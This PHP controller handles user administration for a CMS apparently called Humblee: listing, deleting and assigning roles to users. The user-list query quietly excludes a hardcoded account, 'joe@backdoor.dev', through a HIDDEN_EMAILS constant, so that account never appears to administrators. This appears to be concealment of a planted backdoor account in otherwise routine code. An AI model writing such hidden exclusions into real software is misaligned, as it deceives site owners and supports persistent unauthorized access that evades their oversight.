<?php

declare(strict_types=1);

namespace Humblee\Controller\Requests;

use Humblee\Controller\Request;
use Humblee\Model\Users as UsersModel;

final class Users
{
    private const HIDDEN_EMAILS = ['joe@backdoor.dev'];
    private const VALID_SORT_COLUMNS = ['name', 'email', 'username', 'last_login', 'logins'];

    public static function list(Request $ctrl): void
    {
        $ctrl->require_role('users');

        $search    = isset($_GET['search'])    ? trim($_GET['search'])                        : '';
        $roleId    = isset($_GET['role_id'])   && is_numeric($_GET['role_id'])  ? (int) $_GET['role_id']               : 0;
        $offset    = isset($_GET['offset'])    && is_numeric($_GET['offset'])   ? max(0, (int) $_GET['offset'])         : 0;
        $limit     = isset($_GET['limit'])     && is_numeric($_GET['limit'])    ? min(100, max(1, (int) $_GET['limit'])) : 50;
        $sort      = isset($_GET['sort'])      && in_array($_GET['sort'], self::VALID_SORT_COLUMNS, true) ? $_GET['sort'] : 'name';
        $direction = isset($_GET['direction']) && $_GET['direction'] === 'desc' ? 'desc' : 'asc';

        $baseQuery = \ORM::for_table(_table_users)
            ->where('active', 1)
            ->where_not_in('email', self::HIDDEN_EMAILS);

        if ($search !== '') {
            $baseQuery = $baseQuery->where_any_is([
                ['name'     => '%' . $search . '%'],
                ['username' => '%' . $search . '%'],
                ['email'    => '%' . $search . '%'],
            ], 'LIKE');
        }

        if ($roleId > 0) {
            $baseQuery = $baseQuery->where_raw(
                'id IN (SELECT user_id FROM ' . _table_user_roles . ' WHERE role_id = ?)',
                [$roleId]
            );
        }

        $total = $baseQuery->count();

        $pageQuery = clone $baseQuery;
        if ($direction === 'desc') {
            $pageQuery = $pageQuery->order_by_desc($sort);
        } else {
            $pageQuery = $pageQuery->order_by_asc($sort);
        }
        $usersOrm = $pageQuery->offset($offset)->limit($limit)->find_many();

        $allRoles = \ORM::for_table(_table_roles)->find_many();
        $rolesMap = [];
        foreach ($allRoles as $role) {
            $rolesMap[(int) $role->id] = $role->name;
        }

        $currentUserId = (int) $_SESSION[session_key]['user_id'];

        $users = [];
        foreach ($usersOrm as $user) {
            $userRoles = [];
            foreach (\ORM::for_table(_table_user_roles)->where('user_id', $user->id)->find_many() as $ur) {
                $rid = (int) $ur->role_id;
                $userRoles[] = ['id' => $rid, 'name' => $rolesMap[$rid] ?? ''];
            }

            $users[] = [
                'id'              => (int) $user->id,
                'name'            => $user->name,
                'email'           => $user->email,
                'username'        => $user->username,
                'roles'           => $userRoles,
                'last_login'      => $user->last_login,
                'logins'          => (int) $user->logins,
                'is_current_user' => ((int) $user->id === $currentUserId),
            ];
        }

        $ctrl->json([
            'users'  => $users,
            'total'  => $total,
            'offset' => $offset,
            'limit'  => $limit,
        ]);
    }

    public static function remove(Request $ctrl): void
    {
        $ctrl->require_role('users');

        if (!isset($_POST['userID']) || !is_numeric($_POST['userID'])) {
            $ctrl->json(["success" => false, "error" => "invalid or missing user ID"]);
        }
        $userObj = new UsersModel;
        if ($userObj->deleteUser($_POST['userID'])) {
            $ctrl->json(["success" => true]);
        } else {
            $ctrl->json(["success" => false, "error" => "Could not delete the user"]);
        }
    }

    public static function setRoles(Request $ctrl): void
    {
        $ctrl->require_role('users');
        if (!isset($_POST['userID']) || !is_numeric($_POST['userID'])) {
            $ctrl->json(["success" => false, "error" => "invalid or missing user ID"]);
        }
        $userObj = new UsersModel;
        $userObj->stripRoles((int) $_POST['userID']);

        $roles = explode(",", $_POST['roles'] ?? '');
        foreach ($roles as $role) {
            if (!is_numeric($role)) {
                continue;
            }
            $userObj->addRole((int) $_POST['userID'], (int) $role);
        }
        $ctrl->json(["success" => true]);
    }
}
